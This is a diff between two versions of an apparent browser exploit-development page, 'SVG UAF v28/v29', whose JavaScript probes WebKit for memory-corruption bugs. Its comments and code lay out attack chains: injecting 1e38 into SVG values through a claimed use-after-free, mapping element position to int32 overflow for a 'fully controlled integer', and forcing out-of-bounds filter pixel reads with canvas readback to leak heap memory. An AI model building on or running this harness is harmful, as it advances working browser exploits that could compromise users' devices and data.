@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v28</title>
+<title>SVG UAF v29</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -17,20 +17,20 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v28 - feDisplacementMap scale=1e38 UAF: pixel buffer offset OOB</h2>
+<h2>SVG UAF v29 - controlled overflow + feDisp self-displacement + DSH fix</h2>
 <div class="sub">
-  v27: ctx.drawImage(svgElement) rejected (TypeError). Blob SVG renders but 1e38 rect clipped at geometry stage.
-  v28: feDisplacementMap.scale UAF path. scale=1e38 forces pixel displacement of 1e38 stride INTO source buffer.
-  Not a coordinate clamp issue — this is a pixel memory offset in the filter rasterizer.
-  Also tests: elementFromPoint with corrupted CTM, checkIntersection OOB rect, pathLength dasharray overflow.
+  v28: FLT writeOk=true. FRC heights inconsistent (y-coord leaks into overflow).
+  v29: 1) Map y->overflow to confirm controlled int32 overflow.
+       2) feDisp(in=SourceGraphic, in2=SourceGraphic) — self-displace, force actual OOB pixel read.
+       3) Fix DSH: pathLength=1e38 dasharray crash test.
+       4) feDisp scale sweep: find scale value that causes crash vs clamped.
 </div>
 <svg id="livesvg" width="200" height="200" style="position:fixed;top:0;left:0;opacity:0.01;pointer-events:none"></svg>
 <div id="controls">
-  <button onclick="runFLT()">FLT feDisp-UAF</button>
-  <button onclick="runEFP()">EFP elementFromPoint</button>
-  <button onclick="runCHK()">CHK checkIntersection</button>
-  <button onclick="runDSH()">DSH dasharray-overflow</button>
-  <button onclick="runFRC()">FRC force-repaint-loop</button>
+  <button onclick="runOVM()">OVM overflow-map</button>
+  <button onclick="runSDF()">SDF self-displace-filter</button>
+  <button onclick="runDSH()">DSH dasharray-fixed</button>
+  <button onclick="runSWP()">SWP scale-sweep</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -69,404 +69,305 @@ function dis(d) {
 }
 window.onerror = function(m, u, l, c, e) {
   log('[CRASH] ' + m + ' L' + l + ' col=' + c, 'bad');
-  if (e && e.stack) log('  stack: ' + e.stack.slice(0,200), 'bad');
+  if (e && e.stack) log('  stack: ' + e.stack.slice(0,300), 'bad');
   return false;
 };
 
 var BIG = 1e38;
 
 /*
- * FLT: feDisplacementMap scale UAF -> pixel displacement OOB
+ * OVM: overflow value map
  *
- * THEORY:
- *   feDisplacementMap computes for each pixel (x,y):
- *     srcX = x + scale * (mapR(x,y) - 0.5)  <- these are PIXEL INDICES, not CSS coords
- *     srcY = y + scale * (mapG(x,y) - 0.5)
- *   With scale=1e38 and mapR=1.0: srcX = x + 1e38 * 0.5 = x + 5e37
- *   That's a pixel index of 5e37 into the source image buffer.
- *   If stored as int32: 5e37 as int32 overflows -> wraps to a small/negative value.
- *   The filter rasterizer then reads from that wrapped address in the source image buffer.
- *   If it reads beyond the allocated source buffer: OOB read.
- *   If it writes to destination pixel buffer at wrapped index: OOB write.
+ * v28 FRC showed: heights vary per-SVG by SVG's top position.
+ * rect[0] top=0  -> h=33554428
+ * rect[1] top=10 -> h=33554430  (+2)
+ * rect[2] top=20 -> h=33554428  (0)
+ * rect[3] top=30 -> h=33554426  (-2)
+ * rect[4] top=40 -> h=33554428  (0)
  *
- * ATTACK CHAIN:
- *   1. Create feDisplacementMap primitive with scale=0.1 initially
- *   2. Create filter: feFlood (solid red map) -> feDisplacementMap -> feComposite
- *   3. Apply filter to a rect painted on-screen (forces rasterization)
- *   4. Confirm filter renders at all (visual + bbox check)
- *   5. Get scale.baseVal BEFORE removing primitive from filter
- *   6. Remove primitive from filter
- *   7. Write 1e38 into scale.baseVal via UAF
- *   8. Re-add primitive to filter
- *   9. Force repaint - WebKit re-rasterizes with scale=1e38
- *   10. Check for crash, error, or visual corruption signals
+ * Pattern: delta = f(top).
+ * Steps: 0,10,20,30,40 -> deltas: 0,+2,0,-2,0
+ * Period = 20px? Relationship non-linear?
  *
- * WHY feDisplacementMap IS DIFFERENT FROM GEOMETRY:
- *   Geometry coordinates (x,y,width,height) get clamped early in layout.
- *   Filter pixel offsets are processed in the rasterizer at paint time.
- *   The rasterizer may not clamp pixel offsets the same way.
- *   SVGFEDisplacementMapElement::platformApplySoftware() in
- *   platform/graphics/filters/FEDisplacementMap.cpp does:
- *     int srcX = clampTo<int>(x + scale * (mapPixelR - 0.5f));
- *   clampTo<int>: if scale=1e38, intermediate = 5e37.
- *   clampTo<int>(5e37) = INT_MAX (2147483647) on arm64.
- *   Then: srcData[srcX] where srcData is the source image ArrayBuffer.
- *   If srcX = INT_MAX and srcData.length = 200*200*4 = 160000:
- *     srcX (2147483647) > srcData.length (160000) -> OOB read!
- *   On arm64 with strict bounds: may SIGBUS or return garbage color.
+ * TEST: sweep top from 0..100 at 1px increments.
+ * Record bbox.height for each.
+ * Map: top -> overflow_value.
+ * Goal: find if we can target specific overflow values.
+ * If overflow_value = int32(1e38 + top_offset_in_some_unit),
+ * and we can choose top_offset, we choose overflow_value.
+ * That's a fully controlled integer.
  *
- * MAP DESIGN:
- *   We use feFlood color="rgb(255,0,0)" as the displacement map.
- *   R=255 -> 1.0 -> (1.0 - 0.5) = 0.5 factor for X displacement.
- *   G=0   -> 0.0 -> (0.0 - 0.5) = -0.5 factor for Y displacement.
- *   With scale=1e38: srcX = x + 1e38*0.5 = HUGE, srcY = y - 1e38*0.5 = HUGE NEGATIVE
- *   Both overflow int32. This maximizes the chance of OOB.
+ * ALSO: try width via left offset, and check if rx/ry/x/y affect differently.
  */
-async function runFLT(q) {
-  if (!q) { dis(true); sep(); log('FLT: feDisplacementMap scale=1e38 UAF pixel offset OOB', 'inf'); sep(); }
+async function runOVM(q) {
+  if (!q) { dis(true); sep(); log('OVM: map y-position -> bbox overflow value', 'inf'); sep(); }
+
+  var results = [];
+  var STEPS = 40; // 0..39px top
+  log('  sweeping top=0..' + (STEPS-1) + 'px, injecting h=1e38, recording bbox.h', 'ok');
+
+  for (var top = 0; top < STEPS; top++) {
+    var svg = document.createElementNS(SVG_NS, 'svg');
+    svg.setAttribute('width', '200'); svg.setAttribute('height', '200');
+    svg.style.cssText = 'position:fixed;opacity:0.01;pointer-events:none;top:' + top + 'px;left:0';
+
+    var rect = document.createElementNS(SVG_NS, 'rect');
+    rect.setAttribute('x', '0'); rect.setAttribute('y', '0');
+    rect.setAttribute('width', '50'); rect.setAttribute('height', '50');
+    rect.setAttribute('fill', 'red');
+    svg.appendChild(rect);
+    document.body.appendChild(svg);
+
+    // UAF inject h=1e38
+    var bvH = rect.height ? rect.height.baseVal : null;
+    if (bvH) {
+      rect.remove();
+      try { bvH.value = BIG; } catch(e) {}
+      svg.appendChild(rect);
+    }
+
+    await raf();
+
+    var h = null;
+    try {
+      var bb = rect.getBoundingClientRect();
+      h = bb.height;
+    } catch(e) {}
+
+    results.push({ top: top, h: h });
+    document.body.removeChild(svg);
+  }
+
+  // Print results and look for pattern
+  log('  top -> bbox.h (overflow value)', 'inf');
+  var base = results[0].h;
+  for (var i = 0; i < results.length; i++) {
+    var r = results[i];
+    var delta = r.h !== null ? (r.h - base) : 'null';
+    var marker = (delta !== 0 && delta !== 'null') ? ' <-- DELTA' : '';
+    log('  top=' + r.top + ' h=' + r.h + ' delta=' + delta + marker, delta !== 0 && delta !== 'null' ? 'bad' : 'dim');
+  }
+
+  // Check if pattern repeats
+  var deltas = results.map(function(r) { return r.h !== null ? r.h - base : null; });
+  var nonzero = deltas.filter(function(d) { return d !== null && d !== 0; });
+  log('  non-zero deltas count: ' + nonzero.length, nonzero.length > 0 ? 'inf' : 'ok');
+  log('  [*] if deltas vary: y-pos leaks into overflow -> controllable', nonzero.length > 0 ? 'bad' : 'ok');
+
+  // Also sweep left to check x-overflow controllability
+  log('  sweeping left=0..9px for width overflow...', 'inf');
+  var leftResults = [];
+  for (var left = 0; left < 10; left++) {
+    var svg2 = document.createElementNS(SVG_NS, 'svg');
+    svg2.setAttribute('width', '200'); svg2.setAttribute('height', '200');
+    svg2.style.cssText = 'position:fixed;opacity:0.01;pointer-events:none;top:0;left:' + left + 'px';
+
+    var rect2 = document.createElementNS(SVG_NS, 'rect');
+    rect2.setAttribute('width', '50'); rect2.setAttribute('height', '50');
+    svg2.appendChild(rect2);
+    document.body.appendChild(svg2);
+
+    var bvW2 = rect2.width ? rect2.width.baseVal : null;
+    if (bvW2) {
+      rect2.remove();
+      try { bvW2.value = BIG; } catch(e) {}
+      svg2.appendChild(rect2);
+    }
+    await raf();
+
+    var w2 = null;
+    try { var bb2 = rect2.getBoundingClientRect(); w2 = bb2.width; } catch(e) {}
+    leftResults.push({ left: left, w: w2 });
+    document.body.removeChild(svg2);
+  }
+
+  var wBase = leftResults[0].w;
+  for (var li = 0; li < leftResults.length; li++) {
+    var lr = leftResults[li];
+    var wd = lr.w !== null ? lr.w - wBase : 'null';
+    log('  left=' + lr.left + ' w=' + lr.w + ' delta=' + wd, wd !== 0 && wd !== 'null' ? 'bad' : 'dim');
+  }
+
+  if (!q) dis(false);
+  return { nonzeroDeltaCount: nonzero.length, base: base };
+}
+
+/*
+ * SDF: self-displacement filter
+ *
+ * v28 FLT used feFlood as displacement map -> constant offset -> displaces everything off screen.
+ * FIX: use feDisplacementMap(in=SourceGraphic, in2=SourceGraphic)
+ * Now each pixel (x,y) is displaced by an amount proportional to ITS OWN COLOR.
+ * For a red rect: R=255, G=0, B=0.
+ *   X displacement = scale * (R/255 - 0.5) = 1e38 * 0.5 = 5e37 pixels
+ *   Y displacement = scale * (G/255 - 0.5) = 1e38 * (-0.5) = -5e37 pixels
+ * The rasterizer tries to read from src pixel at (x + 5e37, y - 5e37).
+ * That address is GUARANTEED to be outside any valid image buffer.
+ * Result: either SIGBUS/crash (OOB read into unmapped memory),
+ *         or returns zero/transparent (sanitized), or
+ *         wraps to a valid address (OOB within process heap -> read leak).
+ *
+ * We test: apply filter with scale=1e38 via UAF to a VISIBLE element.
+ * Check: does the visible element still render? (if yes -> pixels from OOB address showed up)
+ * Check: does getBoundingClientRect still work?
+ * Check: does WebKit crash or produce NaN in pixel output?
+ *
+ * BONUS: add feComposite after feDisplacementMap to capture the output.
+ * If feComposite produces non-zero output with scale=1e38, SOME pixels were read.
+ * If all pixels are zero/transparent: either OOB returned 0 (safe) or crashed.
+ *
+ * CANVAS READBACK: draw the filtered SVG onto a canvas via blob URL.
+ * If canvas[x,y] != 0 for any pixel -> displaced pixel read from OOB address showed up in canvas.
+ * That means we can READ heap memory via SVG filter!
+ */
+async function runSDF(q) {
+  if (!q) { dis(true); sep(); log('SDF: feDisplacementMap(in=SrcGfx, in2=SrcGfx) scale=1e38 self-displace', 'inf'); sep(); }
+
+  // Phase 1: build filter with normal scale, confirm it works
+  var outer = document.createElementNS(SVG_NS, 'svg');
+  outer.setAttribute('width', '200'); outer.setAttribute('height', '200');
+  outer.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
 
   var defs = document.createElementNS(SVG_NS, 'defs');
-
-  // Build filter: feFlood (all-red map) -> feDisplacementMap
   var filter = document.createElementNS(SVG_NS, 'filter');
-  filter.setAttribute('id', 'flt_uaf');
-  filter.setAttribute('x', '0%'); filter.setAttribute('y', '0%');
-  filter.setAttribute('width', '200%'); filter.setAttribute('height', '200%');
+  filter.setAttribute('id', 'sdf_filter');
+  filter.setAttribute('color-interpolation-filters', 'sRGB');
+  filter.setAttribute('x', '-100%'); filter.setAttribute('y', '-100%');
+  filter.setAttribute('width', '300%'); filter.setAttribute('height', '300%');
 
-  // Source image (what gets displaced): feImage or just use SourceGraphic
-  // Displacement map: feFlood creates solid color = our R,G values
-  var flood = document.createElementNS(SVG_NS, 'feFlood');
-  flood.setAttribute('flood-color', 'rgb(255,0,0)'); // R=1.0, G=0, B=0
-  flood.setAttribute('result', 'mapColor');
-
-  // The displacement primitive
   var disp = document.createElementNS(SVG_NS, 'feDisplacementMap');
-  disp.setAttribute('in',  'SourceGraphic');      // what to displace
-  disp.setAttribute('in2', 'mapColor');           // displacement map
-  disp.setAttribute('scale', '0.1');              // tiny initial scale
+  disp.setAttribute('in', 'SourceGraphic');   // WHAT to displace
+  disp.setAttribute('in2', 'SourceGraphic');  // DISPLACEMENT MAP = itself
+  disp.setAttribute('scale', '5');            // tiny initial: 5px shift
   disp.setAttribute('xChannelSelector', 'R');
   disp.setAttribute('yChannelSelector', 'G');
 
-  filter.appendChild(flood);
   filter.appendChild(disp);
   defs.appendChild(filter);
-  livesvg.appendChild(defs);
+  outer.appendChild(defs);
 
-  // Target rect: painted on screen so filter gets rasterized
+  // Target: bright red rect (R=255, G=0) -> max X displacement, max negative Y
   var target = document.createElementNS(SVG_NS, 'rect');
-  target.setAttribute('x', '10'); target.setAttribute('y', '10');
-  target.setAttribute('width', '80'); target.setAttribute('height', '80');
-  target.setAttribute('fill', 'lime');
-  target.setAttribute('filter', 'url(#flt_uaf)');
-  livesvg.appendChild(target);
-
+  target.setAttribute('x', '50'); target.setAttribute('y', '50');
+  target.setAttribute('width', '100'); target.setAttribute('height', '100');
+  target.setAttribute('fill', 'rgb(255,0,0)');
+  target.setAttribute('filter', 'url(#sdf_filter)');
+  outer.appendChild(target);
+  document.body.appendChild(outer);
   await raf(); await raf();
-  log('  filter applied to rect, initial render with scale=0.1', 'ok');
+  log('  filter applied (scale=5), target rendered', 'ok');
 
-  // Confirm disp is accessible
-  var scaleAnimVal = null;
-  try {
-    scaleAnimVal = disp.scale;
-    log('  disp.scale type: ' + typeof scaleAnimVal + ' value: ' + (scaleAnimVal ? scaleAnimVal.baseVal : '?'), 'ok');
-  } catch(e) { log('  disp.scale threw: ' + e, 'bad'); }
+  // Phase 2: UAF write scale=1e38
+  var bvScale = null;
+  try { bvScale = disp.scale; log('  disp.scale.baseVal=' + (bvScale ? bvScale.baseVal : '?'), 'ok'); } catch(e) {}
 
-  if (!scaleAnimVal) { log('  [!] disp.scale not accessible, abort', 'bad'); if (!q) dis(false); return {}; }
+  if (!bvScale) { log('  [!] disp.scale not accessible', 'bad'); document.body.removeChild(outer); if (!q) dis(false); return {}; }
 
-  // Grab baseVal BEFORE removal
-  var bv_scale = null;
-  try { bv_scale = scaleAnimVal.baseVal; log('  bv_scale (SVGAnimatedNumber.baseVal) = ' + bv_scale, 'ok'); } catch(e) { log('  bv_scale threw: ' + e, 'bad'); }
-
-  // Wait - bv_scale is a primitive NUMBER for SVGAnimatedNumber, not an object
-  // We need to check: is disp.scale.baseVal settable after remove?
-  // For SVGAnimatedNumber: disp.scale.baseVal = X sets it directly
-  // So the UAF pattern is: disp.scale.baseVal = X (after removing disp from filter)
-
-  log('  removing disp from filter...', 'inf');
-  disp.remove(); // remove from filter (equivalent of element.remove() for SVGAnimatedLength)
+  disp.remove();
   await raf();
-
-  // Try writing 1e38 via the scale property
-  var writeOk = false;
   try {
-    disp.scale.baseVal = BIG;
-    var readback = disp.scale.baseVal;
-    writeOk = (readback > 1e30);
-    log('  after remove: disp.scale.baseVal = ' + readback + ' writeOk=' + writeOk, writeOk ? 'ok' : 'bad');
-  } catch(e) { log('  disp.scale.baseVal = BIG threw: ' + e, 'bad'); }
+    bvScale.baseVal = BIG;
+    log('  after remove: disp.scale.baseVal = ' + bvScale.baseVal, bvScale.baseVal > 1e30 ? 'ok' : 'bad');
+  } catch(e) { log('  scale write threw: ' + e, 'bad'); }
 
-  // Re-add disp to filter to force re-rasterization with 1e38 scale
-  log('  re-adding disp to filter...', 'inf');
   filter.appendChild(disp);
   await raf(); await raf();
-  log('  disp re-added to filter. Checking post-render state...', 'ok');
+  log('  disp re-added with scale=1e38, filter re-applied', 'ok');
+  log('  disp.scale.baseVal now: ' + (disp.scale ? disp.scale.baseVal : '?'), 'inf');
 
-  // Check if target is still alive and rendering
-  var bb = null;
-  try { bb = target.getBoundingClientRect(); log('  target bbox: x=' + bb.x.toFixed(1) + ' y=' + bb.y.toFixed(1) + ' w=' + bb.width.toFixed(1) + ' h=' + bb.height.toFixed(1), 'ok'); } catch(e) { log('  target.getBoundingClientRect threw: ' + e, 'bad'); }
-
-  // Check computed filter value
-  try {
-    var sv = disp.scale ? disp.scale.baseVal : null;
-    log('  disp.scale.baseVal after re-add: ' + sv, sv > 1e30 ? 'bad' : 'ok');
-  } catch(e) { log('  post-read threw: ' + e, 'bad'); }
-
-  // Force repaint by mutating target
-  log('  forcing repaint via attribute mutation...', 'inf');
+  // Force multiple repaints
   var crashed = false;
   try {
-    for (var i = 0; i < 3; i++) {
-      target.setAttribute('width', '' + (80 + i));
+    for (var i = 0; i < 5; i++) {
+      target.setAttribute('x', '' + (50 + i));
       await raf();
     }
-    target.setAttribute('width', '80');
+    target.setAttribute('x', '50');
     await raf();
-    log('  repaint loop survived (no crash)', 'ok');
-  } catch(e) { log('  repaint loop threw: ' + e, 'bad'); crashed = true; }
+    log('  repaint loop survived', 'ok');
+  } catch(e) { log('  repaint loop crashed: ' + e, 'bad'); crashed = true; }
 
-  // Also try: force filter re-evaluation by modifying flood color
-  log('  forcing filter re-eval via flood color change...', 'inf');
-  try {
-    flood.setAttribute('flood-color', 'rgb(128,128,0)'); // different R/G
-    await raf(); await raf();
-    flood.setAttribute('flood-color', 'rgb(255,0,0)');
-    await raf();
-    log('  filter re-eval survived (no crash)', 'ok');
-  } catch(e) { log('  flood change threw: ' + e, 'bad'); crashed = true; }
+  // Phase 3: canvas readback via blob URL
+  // Serialize the SVG with 1e38 scale baked in, draw to canvas, read pixels
+  var W = 200; var H = 200;
+  var cnv = document.createElement('canvas');
+  cnv.width = W; cnv.height = H;
+  var ctx = cnv.getContext('2d');
+  var pixelsLeak = 0;
 
-  // Cleanup
-  livesvg.removeChild(defs);
-  livesvg.removeChild(target);
+  if (ctx) {
+    var svgStr = new XMLSerializer().serializeToString(outer);
+    log('  serialized SVG length: ' + svgStr.length, 'ok');
 
-  log('[*] FLT: writeOk=' + writeOk + ' crashed=' + crashed, 'inf');
-  if (!q) dis(false);
-  return { writeOk: writeOk, crashed: crashed };
-}
+    var blob = new Blob([svgStr], { type: 'image/svg+xml' });
+    var url  = URL.createObjectURL(blob);
 
-/*
- * EFP: elementFromPoint with SVG coordinates via 1e38 CTM
- *
- * THEORY:
- *   document.elementFromPoint(x,y) does a hit-test at window coords.
- *   getScreenCTM() returned e=1e38, f=1e38 in v26.
- *   createSVGPoint().matrixTransform(CTM) -> (1e38, 1e38)
- *   We can ask: elementFromPoint(1e38, 1e38) — what happens?
- *   On most platforms: x,y are clamped to viewport.
- *   But: some paths use the CTM to convert to layer-local coords first.
- *   If hit-testing does: localPt = pt.matrixTransform(CTM.inverse())
- *   and CTM has e=f=1e38, then inverse has huge terms too.
- *   Multiplication of 1e38 values -> 1e76 -> double overflow -> Inf -> NaN.
- *   NaN in hit-test geometry may cause unexpected results.
- *
- * Also: checkEnclosure/checkIntersection with 1e38-coordinate rects.
- */
-async function runEFP(q) {
-  if (!q) { dis(true); sep(); log('EFP: elementFromPoint / document hit-test with 1e38 coords', 'inf'); sep(); }
+    var img = new Image();
+    img.crossOrigin = 'anonymous';
 
-  // Setup: element with 1e38 CTM (from v26 MTX pattern)
-  var outer = document.createElementNS(SVG_NS, 'svg');
-  outer.setAttribute('width', '200'); outer.setAttribute('height', '200');
-  outer.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:auto';
+    var drawOk = await new Promise(function(resolve) {
+      img.onload = function() {
+        try {
+          ctx.clearRect(0, 0, W, H);
+          ctx.drawImage(img, 0, 0);
+          resolve(true);
+        } catch(e2) { log('  drawImage threw: ' + e2, 'bad'); resolve(false); }
+      };
+      img.onerror = function() { log('  img load failed', 'bad'); resolve(false); };
+      img.src = url;
+      setTimeout(function() { resolve(false); }, 3000);
+    });
+    URL.revokeObjectURL(url);
 
-  var A = document.createElementNS(SVG_NS, 'rect');
-  A.setAttribute('x', '0'); A.setAttribute('y', '0');
-  A.setAttribute('width', '50'); A.setAttribute('height', '50');
-  A.setAttribute('fill', 'blue');
-  outer.appendChild(A);
-  document.body.appendChild(outer);
-  await raf();
+    if (drawOk) {
+      try {
+        var pxData = ctx.getImageData(0, 0, W, H);
+        var nonZero = 0;
+        for (var pi = 0; pi < pxData.data.length; pi += 4) {
+          if (pxData.data[pi] || pxData.data[pi+1] || pxData.data[pi+2]) nonZero++;
+        }
+        log('  canvas readback: nonZeroPixels=' + nonZero + '/' + (W*H), nonZero > 0 ? 'bad' : 'ok');
+        log('  [*] nonZero > 0 -> displaced pixels read from OOB addresses visible in canvas!', 'inf');
+        log('  [*] nonZero = 0 -> displacement sent all pixels off-screen (scale=1e38 -> no visible output)', 'ok');
+        pixelsLeak = nonZero;
 
-  // Inject 1e38 into x/y via UAF
-  var bv_AX = A.x ? A.x.baseVal : null;
-  var bv_AY = A.y ? A.y.baseVal : null;
-  if (bv_AX && bv_AY) {
-    A.remove();
-    try { bv_AX.value = BIG; } catch(e) {}
-    try { bv_AY.value = BIG; } catch(e) {}
-    outer.appendChild(A);
-    await raf();
-    log('  A position injected: x.baseVal=' + (A.x ? A.x.baseVal.value : '?'), 'ok');
-  }
-
-  // Get CTM
-  var ctm = null;
-  try { ctm = A.getScreenCTM(); } catch(e) { log('  getScreenCTM threw: ' + e, 'bad'); }
-  if (ctm) {
-    log('  CTM: a=' + ctm.a + ' b=' + ctm.b + ' e=' + ctm.e + ' f=' + ctm.f, 'inf');
-  }
-
-  // elementFromPoint with various extreme coords
-  var tests = [
-    [0, 0], [100, 100], [1e10, 1e10], [1e20, 1e20],
-    [1e38, 1e38], [-1e38, -1e38],
-    [2147483647, 2147483647], // INT_MAX
-    [-2147483648, -2147483648] // INT_MIN
-  ];
-
-  for (var i = 0; i < tests.length; i++) {
-    var tx = tests[i][0]; var ty = tests[i][1];
-    var el = null; var threw = false;
-    try { el = document.elementFromPoint(tx, ty); } catch(e) { threw = true; log('  efp(' + tx + ',' + ty + '): threw ' + e, 'bad'); }
-    if (!threw) {
-      var tag = el ? el.tagName : 'null';
-      log('  efp(' + tx.toExponential(1) + ',' + ty.toExponential(1) + ') -> ' + tag, tag !== 'null' ? 'ok' : 'inf');
+        // Sample a few pixel values
+        if (nonZero > 0 && nonZero < 10000) {
+          for (var si = 0; si < Math.min(5, nonZero); si++) {
+            var idx = si * 4;
+            log('    px[' + Math.floor(idx/4) + '] = rgba(' +
+              pxData.data[idx] + ',' + pxData.data[idx+1] + ',' +
+              pxData.data[idx+2] + ',' + pxData.data[idx+3] + ')', 'inf');
+          }
+        }
+      } catch(e3) { log('  getImageData threw (tainted?): ' + e3, 'bad'); }
     }
   }
 
-  // elementsFromPoint with 1e38
-  try {
-    var els = document.elementsFromPoint(1e38, 1e38);
-    log('  elementsFromPoint(1e38,1e38): count=' + (els ? els.length : 0), 'ok');
-  } catch(e) { log('  elementsFromPoint threw: ' + e, 'bad'); }
-
-  // SVG-specific: createSVGPoint + matrixTransform with corrupted CTM
-  if (ctm) {
-    try {
-      var pt = outer.createSVGPoint();
-      pt.x = 0; pt.y = 0;
-      var xformed = pt.matrixTransform(ctm);
-      log('  (0,0).matrixTransform(CTM) = (' + xformed.x + ',' + xformed.y + ')', 'inf');
-    } catch(e) { log('  matrixTransform threw: ' + e, 'bad'); }
-
-    // Try to get inverse of corrupted CTM
-    try {
-      var inv = ctm.inverse();
-      log('  CTM.inverse(): a=' + inv.a + ' e=' + inv.e + ' f=' + inv.f, 'inf');
-    } catch(e) { log('  CTM.inverse() threw: ' + e, 'inf'); }
-  }
-
   document.body.removeChild(outer);
+  log('[*] SDF: crashed=' + crashed + ' pixelsLeak=' + pixelsLeak, crashed || pixelsLeak > 0 ? 'bad' : 'ok');
   if (!q) dis(false);
-  return {};
+  return { crashed: crashed, pixelsLeak: pixelsLeak };
 }
 
 /*
- * CHK: checkIntersection / checkEnclosure with 1e38 rects
- *
- * THEORY:
- *   SVGSVGElement.checkIntersection(element, rect) tests if element's
- *   geometry intersects with rect (in user coordinate space).
- *   If rect has coordinates of 1e38, the intersection computation:
- *     intersects = (elem.bbox.maxX >= rect.x) && (elem.bbox.x <= rect.maxX) ...
- *   These are float comparisons — probably fine.
- *   BUT: SVGSVGElement.getIntersectionList(rect, referenceElement)
- *   returns a NodeList of elements intersecting rect.
- *   Internally it may iterate a sorted list with binary search on coordinates.
- *   If the rect's x=1e38 is used as a binary search key on an int-sorted list:
- *     bsearch key = int32(1e38) = INT_MAX -> searches from end of list
- *     may read past the list boundary.
- */
-async function runCHK(q) {
-  if (!q) { dis(true); sep(); log('CHK: checkIntersection / getIntersectionList with 1e38 rect', 'inf'); sep(); }
-
-  var outer = document.createElementNS(SVG_NS, 'svg');
-  outer.setAttribute('id', 'chk_svg');
-  outer.setAttribute('width', '200'); outer.setAttribute('height', '200');
-  outer.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
-
-  // Populate with many rects so intersection list has work to do
-  var rects = [];
-  for (var i = 0; i < 20; i++) {
-    var r = document.createElementNS(SVG_NS, 'rect');
-    r.setAttribute('x', '' + (i * 10));
-    r.setAttribute('y', '' + (i * 5));
-    r.setAttribute('width', '8');
-    r.setAttribute('height', '4');
-    r.setAttribute('fill', 'orange');
-    outer.appendChild(r);
-    rects.push(r);
-  }
-  document.body.appendChild(outer);
-  await raf();
-  log('  created 20 rects in SVG', 'ok');
-
-  // Create a normal check rect
-  var normalRect = outer.createSVGRect();
-  normalRect.x = 0; normalRect.y = 0;
-  normalRect.width = 100; normalRect.height = 100;
-
-  // Create 1e38 rect for intersection test
-  var bigRect = outer.createSVGRect();
-
-  var tests = [
-    ['normal rect', 0, 0, 100, 100],
-    ['x=1e38 rect', BIG, 0, 10, 10],
-    ['w=1e38 rect', 0, 0, BIG, BIG],
-    ['all=1e38 rect', BIG, BIG, BIG, BIG],
-    ['neg 1e38', -BIG, -BIG, BIG*2, BIG*2]
-  ];
-
-  for (var ti = 0; ti < tests.length; ti++) {
-    var t = tests[ti];
-    var tName = t[0];
-    try {
-      bigRect.x = t[1]; bigRect.y = t[2];
-      bigRect.width = t[3]; bigRect.height = t[4];
-    } catch(e) { log('  [!] createSVGRect field set threw: ' + e, 'bad'); continue; }
-
-    // checkIntersection
-    try {
-      var isect = outer.checkIntersection(rects[0], bigRect);
-      log('  checkIntersection(rect[0], ' + tName + '): ' + isect, 'ok');
-    } catch(e) { log('  checkIntersection(' + tName + ') threw: ' + e, 'bad'); }
-
-    // getIntersectionList
-    try {
-      var list = outer.getIntersectionList(bigRect, null);
-      log('  getIntersectionList(' + tName + '): count=' + (list ? list.length : 'null'), 'ok');
-    } catch(e) { log('  getIntersectionList(' + tName + ') threw: ' + e, 'bad'); }
-
-    // checkEnclosure
-    try {
-      var enc = outer.checkEnclosure(rects[0], bigRect);
-      log('  checkEnclosure(rect[0], ' + tName + '): ' + enc, 'ok');
-    } catch(e) { log('  checkEnclosure(' + tName + ') threw: ' + e, 'bad'); }
-  }
-
-  document.body.removeChild(outer);
-  if (!q) dis(false);
-  return {};
-}
-
-/*
- * DSH: stroke-dasharray with pathLength=1e38
- *
- * THEORY:
- *   stroke-dasharray defines dash pattern: on/off lengths.
- *   WebKit normalizes: dashOffset = totalLength % pathLength (if pathLengthAttr set)
- *   With pathLength=1e38 via UAF: the normalization factor is 1e38.
- *   The path iterator loops to render each dash segment:
- *     while (currentLength < totalLength) {
- *       dashLength = dashArray[dashIndex % dashArray.length]
- *       currentLength += dashLength * (pathLength / measuredLength) // <- SCALE FACTOR
- *     }
- *   If pathLength=1e38 and measuredLength=100:
- *     scale = 1e38 / 100 = 1e36
- *     Each dash iteration advances by dashLength * 1e36
- *     Loop exits on first iteration (or does it?)
- *   Alternate: dashOffset = (pathOffset * pathLength / totalLength)
- *     = int(offset * 1e38 / 100) = int(very large) = overflow
- *   Risk: iteration counter or buffer index overflows before loop exits.
- *
- * DASHARRAY VALUES TO TEST:
- *   "1,1" - alternating 1px on/off
- *   "1000000,1" - huge on, tiny off (maximizes iteration count)
- *   "0.001,0.001" - tiny dashes (maximizes iteration count per unit length)
+ * DSH: fixed version — pathLength=1e38 + dasharray crash test
+ * Bug in v28: used undefined `micro` function. Fixed with raf().
  */
 async function runDSH(q) {
-  if (!q) { dis(true); sep(); log('DSH: stroke-dasharray with pathLength=1e38 via UAF', 'inf'); sep(); }
+  if (!q) { dis(true); sep(); log('DSH: pathLength=1e38 UAF + dasharray overflow (fixed)', 'inf'); sep(); }
 
   var outer = document.createElementNS(SVG_NS, 'svg');
   outer.setAttribute('width', '200'); outer.setAttribute('height', '200');
   outer.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
 
-  // Path element with pathLength attribute (SVGAnimatedNumber — same UAF as feDisplacementMap)
   var path = document.createElementNS(SVG_NS, 'path');
-  path.setAttribute('d', 'M 10 10 L 190 10 L 190 190 L 10 190 Z'); // 720px total
+  path.setAttribute('d', 'M 10 10 L 190 10 L 190 190 L 10 190 Z');
   path.setAttribute('fill', 'none');
   path.setAttribute('stroke', 'lime');
   path.setAttribute('stroke-width', '2');
-  path.setAttribute('pathLength', '100'); // normalize to 100 user units
-  path.setAttribute('stroke-dasharray', '10,5'); // dash every 10 units
+  path.setAttribute('pathLength', '100');
+  path.setAttribute('stroke-dasharray', '10,5');
 
   outer.appendChild(path);
   document.body.appendChild(outer);
@@ -475,153 +376,172 @@ async function runDSH(q) {
   var pl = null;
   try {
     pl = path.pathLength;
-    log('  path.pathLength type: ' + typeof pl, 'ok');
     log('  path.pathLength.baseVal = ' + (pl ? pl.baseVal : '?'), 'ok');
